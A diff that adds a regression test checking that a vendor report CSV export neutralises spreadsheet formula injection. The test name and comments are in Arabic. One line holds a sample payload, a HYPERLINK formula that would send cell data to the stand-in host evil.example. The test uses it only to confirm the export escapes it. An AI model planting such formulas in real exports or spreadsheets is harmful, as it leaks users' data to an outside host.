@@ -227,6 +227,25 @@ describe('VD-19 · أرقام البائع من دفتره', () => {
     expect(x.statusCode).toBe(200);
     expect(x.headers['content-type']).toContain('spreadsheetml');
   });
+
+  it('اسم منتج يبدأ بمعادلة يُصدَّر نصّاً لا معادلة — والمبالغ تبقى أرقاماً', async () => {
+    if (!dbUp) return;
+    const evil = '=HYPERLINK("https://evil.example/?d="&A1,"اضغط")';
+    const where = { productId: seats[0]!.productId };
+    const before = await prisma.orderItem.findFirstOrThrow({ where, select: { productNameSnapshotAr: true } });
+    await prisma.orderItem.updateMany({ where, data: { productNameSnapshotAr: evil } });
+    try {
+      const res = await call('GET', `/vendor/reports/export.csv?from=${today}&to=${today}`, seats[0]!.token);
+      expect(res.statusCode).toBe(200);
+      const cells = res.body.split(/\r\n/).flatMap((line) => line.split(/,(?=")/));
+      // لا خانة تبدأ بمحرف معادلة بعد علامة الاقتباس
+      expect(cells.filter((c) => /^"[=+@\t\r]/.test(c))).toEqual([]);
+      expect(res.body).toContain(`"'=HYPERLINK(""https://evil.example/?d=""&A1,""اضغط"")"`);
+      expect(res.body).toContain('"30000"');
+    } finally {
+      await prisma.orderItem.updateMany({ where, data: { productNameSnapshotAr: before.productNameSnapshotAr } });
+    }
+  });
 });
 
 describe('VD-19 · المدى والصلاحية', () => {
